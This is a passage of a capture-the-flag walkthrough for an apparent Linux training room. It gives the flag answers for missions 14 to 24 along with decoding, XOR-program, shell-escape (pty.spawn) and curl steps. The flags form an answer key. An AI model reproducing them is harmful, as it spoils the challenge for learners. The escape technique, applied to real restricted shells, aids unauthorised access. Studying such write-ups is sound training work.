          <table:table-cell table:style-name="Table15.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="P1">4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table15.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission13@linuxagency:~$ cat flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission13@linuxagency:~$ cat flag.txt | base64 -d</text:p>
            <text:p text:style-name="P1">mission14{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission15 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission15{fc4915d818bfaeff01185c3547f25596}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">The flag is encoded in binary:</text:p>
      <table:table table:name="Table16" table:style-name="Table16">
        <table:table-column table:style-name="Table16.A"/>
        <table:table-column table:style-name="Table16.B"/>
        <table:table-row table:style-name="TableLine94402688937552">
          <table:table-cell table:style-name="Table16.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table16.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission14@linuxagency:~$ cat flag.txt</text:p>
            <text:p text:style-name="P1">01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">I used my library <text:a xlink:type="simple" xlink:href="https://github.com/noraj/ctf-party/" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ctf-party</text:a> to decode it.</text:p>
      <table:table table:name="Table17" table:style-name="Table17">
        <table:table-column table:style-name="Table17.A"/>
        <table:table-column table:style-name="Table17.B"/>
        <table:table-row table:style-name="TableLine94402688949184">
          <table:table-cell table:style-name="Table17.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="P1">5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table17.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ ctf_party_console</text:p>
            <text:p text:style-name="Preformatted_20_Text">irb(main):001:0&gt; flag = '0110110101101001011100110111001101101001011011110110111000110001001101010111101101100110011000110011010000111001001100010011010101100100001110000011000100111000011000100110011001100001011001010110011001100110001</text:p>
            <text:p text:style-name="Preformatted_20_Text">1000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101'</text:p>
            <text:p text:style-name="Preformatted_20_Text">irb(main):003:0&gt; flag.bin2hex.hex2str</text:p>
            <text:p text:style-name="P1">=&gt; "mission15{edited}"</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission16 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission16{884417d40033c4c2091b44d7c26a908e}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">The time the flag is hexadecimal encoded.</text:p>
      <table:table table:name="Table18" table:style-name="Table18">
        <table:table-column table:style-name="Table18.A"/>
        <table:table-column table:style-name="Table18.B"/>
        <table:table-row table:style-name="TableLine94402688968784">
          <table:table-cell table:style-name="Table18.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="P1">6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table18.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission15@linuxagency:~$ cat flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission15@linuxagency:~$ cat flag.txt | base32 -d</text:p>
            <text:p text:style-name="Preformatted_20_Text">base32: invalid input</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission15@linuxagency:~$ cat flag.txt | xxd -r -p</text:p>
            <text:p text:style-name="P1">mission16{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Or with <text:a xlink:type="simple" xlink:href="https://github.com/noraj/ctf-party/" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ctf-party</text:a>:</text:p>
      <table:table table:name="Table19" table:style-name="Table19">
        <table:table-column table:style-name="Table19.A"/>
        <table:table-column table:style-name="Table19.B"/>
        <table:table-row table:style-name="TableLine94402688987840">
          <table:table-cell table:style-name="Table19.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table19.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">ctf_party_console</text:p>
            <text:p text:style-name="Preformatted_20_Text">irb(main):001:0&gt; flag = '6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D'</text:p>
            <text:p text:style-name="Preformatted_20_Text">=&gt; "6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D"</text:p>
            <text:p text:style-name="Preformatted_20_Text">irb(main):002:0&gt; flag.from_hex</text:p>
            <text:p text:style-name="Preformatted_20_Text">=&gt; "mission16{edited}"</text:p>
            <text:p text:style-name="Preformatted_20_Text">irb(main):003:0&gt; flag.hex2str</text:p>
            <text:p text:style-name="P1">=&gt; "mission16{edited}"</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission17 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission17{49f8d1348a1053e221dfe7ff99f5cbf4}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Here the flag is an executable binary:</text:p>
      <table:table table:name="Table20" table:style-name="Table20">
        <table:table-column table:style-name="Table20.A"/>
        <table:table-column table:style-name="Table20.B"/>
        <table:table-row table:style-name="TableLine94402689011536">
          <table:table-cell table:style-name="Table20.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table20.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission16@linuxagency:~$ file flag</text:p>
            <text:p text:style-name="Preformatted_20_Text">flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1606102f7b80d832eabee1087180ea7ce24a96ca, not stripped</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission16@linuxagency:~$ chmod u+x flag</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission16@linuxagency:~$ ./flag</text:p>
            <text:p text:style-name="P1">mission17{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations"><text:soft-page-break/>What is the mission18 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission18{f09760649986b489cda320ab5f7917e8}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">We have a flag which is encrypted in a Java file.</text:p>
      <table:table table:name="Table21" table:style-name="Table21">
        <table:table-column table:style-name="Table21.A"/>
        <table:table-column table:style-name="Table21.B"/>
        <table:table-row table:style-name="TableLine94402689032624">
          <table:table-cell table:style-name="Table21.A1" office:value-type="string">
            <text:p text:style-name="P1">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table21.A1" office:value-type="string">
            <text:p text:style-name="P1">mission17@linuxagency:~$ cat flag.java</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <table:table table:name="Table22" table:style-name="Table22">
        <table:table-column table:style-name="Table22.A"/>
        <table:table-column table:style-name="Table22.B"/>
        <table:table-row table:style-name="TableLine94402689041136">
          <table:table-cell table:style-name="Table22.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text">14</text:p>
            <text:p text:style-name="P1">15</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table22.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">import java.util.*;</text:p>
            <text:p text:style-name="Preformatted_20_Text">public class flag</text:p>
            <text:p text:style-name="Preformatted_20_Text">{</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>public static void main(String[] args)</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>{</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>String outputString="";</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>String encrypted_flag="`d~~dbc&lt;5vk=4:;=;9445;o954nil&gt;?=lo8k:4&lt;:h5p";</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>int length = encrypted_flag.length();</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>for (int i = 0 ; i &lt; length ; i++)</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>{</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>outputString = outputString + Character.toString((char) (encrypted_flag.charAt(i) ^ 13));</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>System.out.println(outputString);</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
            <text:p text:style-name="P1">}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">It's just a XOR with a simple key (13) so we could break it easily outside but I may be even easier just to compile the Java class. So compile &amp; run it:</text:p>
      <table:table table:name="Table23" table:style-name="Table23">
        <table:table-column table:style-name="Table23.A"/>
        <table:table-column table:style-name="Table23.B"/>
        <table:table-row table:style-name="TableLine94402689031760">
          <table:table-cell table:style-name="Table23.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="P1">5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table23.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission17@linuxagency:~$ javac flag.java</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission17@linuxagency:~$ ls</text:p>
            <text:p text:style-name="Preformatted_20_Text">flag.class <text:s/>flag.java</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission17@linuxagency:~$ java flag</text:p>
            <text:p text:style-name="P1">mission18{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission19 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission19{a0bf41f56b3ac622d808f7a4385254b7}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Now we have another xor but in ruby this time:</text:p>
      <table:table table:name="Table24" table:style-name="Table24">
        <table:table-column table:style-name="Table24.A"/>
        <table:table-column table:style-name="Table24.B"/>
        <table:table-row table:style-name="TableLine94402689095280">
          <table:table-cell table:style-name="Table24.A1" office:value-type="string">
            <text:p text:style-name="P1">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table24.A1" office:value-type="string">
            <text:p text:style-name="P1">mission18@linuxagency:~$ cat flag.rb</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <table:table table:name="Table25" table:style-name="Table25">
        <table:table-column table:style-name="Table25.A"/>
        <table:table-column table:style-name="Table25.B"/>
        <table:table-row table:style-name="TableLine94402689103888">
          <table:table-cell table:style-name="Table25.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="P1">12</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table25.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">def encryptDecrypt(string)</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>key = ['K', 'C', 'Q']</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>result = ""</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>codepoints = string.each_codepoint.to_a</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>codepoints.each_index do |i|</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result += (codepoints[i] ^ 'Z'.ord).chr</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>end</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>result</text:p>
            <text:p text:style-name="Preformatted_20_Text">end</text:p>
            <text:p text:style-name="Preformatted_20_Text">encrypted = encryptDecrypt("73))354kc!;j8&lt;nk&lt;ol8i;9lhh&gt;bjb&lt;m;nibohon8m'")</text:p>
            <text:p text:style-name="P1">puts "#{encrypted}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">This time no compilation needed.</text:p>
      <table:table table:name="Table26" table:style-name="Table26">
        <table:table-column table:style-name="Table26.A"/>
        <table:table-column table:style-name="Table26.B"/>
        <table:table-row table:style-name="TableLine94402689094320">
          <table:table-cell table:style-name="Table26.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table26.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission18@linuxagency:~$ ruby flag.rb</text:p>
            <text:p text:style-name="P1">mission19{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations"><text:soft-page-break/>What is the mission20 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission20{b0482f9e90c8ad2421bf4353cd8eae1c}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">A XOR again but in C.</text:p>
      <table:table table:name="Table27" table:style-name="Table27">
        <table:table-column table:style-name="Table27.A"/>
        <table:table-column table:style-name="Table27.B"/>
        <table:table-row table:style-name="TableLine94402689145712">
          <table:table-cell table:style-name="Table27.A1" office:value-type="string">
            <text:p text:style-name="P1">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table27.A1" office:value-type="string">
            <text:p text:style-name="P1">mission19@linuxagency:~$ cat flag.c</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <table:table table:name="Table28" table:style-name="Table28">
        <table:table-column table:style-name="Table28.A"/>
        <table:table-column table:style-name="Table28.B"/>
        <table:table-row table:style-name="TableLine94402689154576">
          <table:table-cell table:style-name="Table28.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="P1">13</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table28.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">#include&lt;stdio.h&gt;</text:p>
            <text:p text:style-name="Preformatted_20_Text">int main()</text:p>
            <text:p text:style-name="Preformatted_20_Text">{</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>char flag[] = "gcyyced8:qh:&gt;28l3o3:i2kn8&gt;8;hl&gt;9?9in2oko;iw";</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>int length = strlen(flag);</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>for (int i = 0 ; i &lt; length ; i++)</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>{</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>flag[i] = flag[i] ^ 10;</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>printf("%c",flag[i]);</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>printf("\n\n");</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return 0;</text:p>
            <text:p text:style-name="P1">}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Let's compile &amp; run it:</text:p>
      <table:table table:name="Table29" table:style-name="Table29">
        <table:table-column table:style-name="Table29.A"/>
        <table:table-column table:style-name="Table29.B"/>
        <table:table-row table:style-name="TableLine94402689184928">
          <table:table-cell table:style-name="Table29.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="P1">9</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table29.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission19@linuxagency:~$ gcc flag.c</text:p>
            <text:p text:style-name="Preformatted_20_Text">flag.c: In function ‘main’:</text:p>
            <text:p text:style-name="Preformatted_20_Text">flag.c:5:18: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="5"/>int length = strlen(flag);</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="18"/>^~~~~~</text:p>
            <text:p text:style-name="Preformatted_20_Text">flag.c:5:18: warning: incompatible implicit declaration of built-in function ‘strlen’</text:p>
            <text:p text:style-name="Preformatted_20_Text">flag.c:5:18: note: include ‘&lt;string.h&gt;’ or provide a declaration of ‘strlen’</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission19@linuxagency:~$ ./a.out</text:p>
            <text:p text:style-name="P1">mission20{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission21 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission21{7de756aabc528b446f6eb38419318f0c}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Another XOR in python.</text:p>
      <table:table table:name="Table30" table:style-name="Table30">
        <table:table-column table:style-name="Table30.A"/>
        <table:table-column table:style-name="Table30.B"/>
        <table:table-row table:style-name="TableLine94402689210672">
          <table:table-cell table:style-name="Table30.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="P1">6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table30.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission20@linuxagency:~$ cat flag.py</text:p>
            <text:p text:style-name="Preformatted_20_Text">flag = "&gt;: <text:s/>:&lt;=ab(d76dfe2210fak1gge5e61`kgbj`bk5c0."</text:p>
            <text:p text:style-name="Preformatted_20_Text">for i in range(len(flag)):</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>flag = (flag[:i] + chr(ord(flag[i]) ^ ord("S")) +flag[i + 1:]);</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(flag[i], end = "");</text:p>
            <text:p text:style-name="P1">print()</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Execute it:</text:p>
      <table:table table:name="Table31" table:style-name="Table31">
        <table:table-column table:style-name="Table31.A"/>
        <table:table-column table:style-name="Table31.B"/>
        <table:table-row table:style-name="TableLine94402689229008">
          <table:table-cell table:style-name="Table31.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table31.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission20@linuxagency:~$ python3 flag.py</text:p>
            <text:p text:style-name="P1">mission21{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission22 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission22{24caa74eb0889ed6a2e6984b42d49aaf}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">We have just a <text:span text:style-name="Source_20_Text">sh</text:span> shell, just by launching <text:span text:style-name="Source_20_Text">bash</text:span> the flag appears.</text:p>
      <text:p text:style-name="Quotations">What is the mission23 flag?</text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>Answer: <text:span text:style-name="Source_20_Text">mission23{3710b9cb185282e3f61d2fd8b1b4ffea}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Here we have a python interpreter as a shell.</text:p>
      <text:p text:style-name="Text_20_body">One way to do it is to make spawn a shell from python.</text:p>
      <table:table table:name="Table32" table:style-name="Table32">
        <table:table-column table:style-name="Table32.A"/>
        <table:table-column table:style-name="Table32.B"/>
        <table:table-row table:style-name="TableLine94402689247120">
          <table:table-cell table:style-name="Table32.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="P1">9</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table32.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission21@linuxagency:~$ su mission22</text:p>
            <text:p text:style-name="Preformatted_20_Text">Password:</text:p>
            <text:p text:style-name="Preformatted_20_Text">Python 3.6.9 (default, Oct <text:s/>8 2020, 12:12:24)</text:p>
            <text:p text:style-name="Preformatted_20_Text">[GCC 8.4.0] on linux</text:p>
            <text:p text:style-name="Preformatted_20_Text">Type "help", "copyright", "credits" or "license" for more information.</text:p>
            <text:p text:style-name="Preformatted_20_Text">&gt;&gt;&gt; import pty</text:p>
            <text:p text:style-name="Preformatted_20_Text">&gt;&gt;&gt; pty.spawn("/bin/bash")</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission22@linuxagency:/home/mission21$ cd</text:p>
            <text:p text:style-name="P1">mission22@linuxagency:~$ cat flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission24 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission24{dbaeb06591a7fd6230407df3a947b89c}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Here we can check the existing hosts in <text:span text:style-name="Source_20_Text">/etc/hosts</text:span>, there are severals configured for 127.0.0.1. One is for our mission, it must be configured with an Apache httpd virtual host. We can use curl to browse web pages in CLI.</text:p>
      <table:table table:name="Table33" table:style-name="Table33">
        <table:table-column table:style-name="Table33.A"/>
        <table:table-column table:style-name="Table33.B"/>
        <table:table-row table:style-name="TableLine94402689274176">
          <table:table-cell table:style-name="Table33.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="Preformatted_20_Text">13</text:p>
            <text:p text:style-name="Preformatted_20_Text">14</text:p>
            <text:p text:style-name="P1">15</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table33.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission23@linuxagency:~$ cat message.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">The hosts will help you.</text:p>
            <text:p text:style-name="Preformatted_20_Text">[OPTIONAL] Maybe you will need curly hairs.</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission23@linuxagency:~$ cat /etc/hosts</text:p>
            <text:p text:style-name="Preformatted_20_Text">127.0.0.1 <text:s text:c="6"/>localhost <text:s text:c="6"/>linuxagency <text:s text:c="4"/>mission24.com</text:p>
            <text:p text:style-name="Preformatted_20_Text">127.0.1.1 <text:s text:c="6"/>ubuntu <text:s/>linuxagency</text:p>
            <text:p text:style-name="Preformatted_20_Text"># The following lines are desirable for IPv6 capable hosts</text:p>
            <text:p text:style-name="Preformatted_20_Text">::1 <text:s text:c="4"/>ip6-localhost ip6-loopback <text:s text:c="5"/>linuxagency</text:p>
            <text:p text:style-name="Preformatted_20_Text">fe00::0 ip6-localnet</text:p>
            <text:p text:style-name="Preformatted_20_Text">ff00::0 ip6-mcastprefix</text:p>
            <text:p text:style-name="Preformatted_20_Text">ff02::1 ip6-allnodes</text:p>
            <text:p text:style-name="Preformatted_20_Text">ff02::2 ip6-allrouters</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission23@linuxagency:~$ curl http://mission24.com -s | grep mission</text:p>
            <text:p text:style-name="P1"><text:s text:c="4"/>&lt;title&gt;mission24{edited}&lt;/title&gt;</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission25 flag?</text:p>
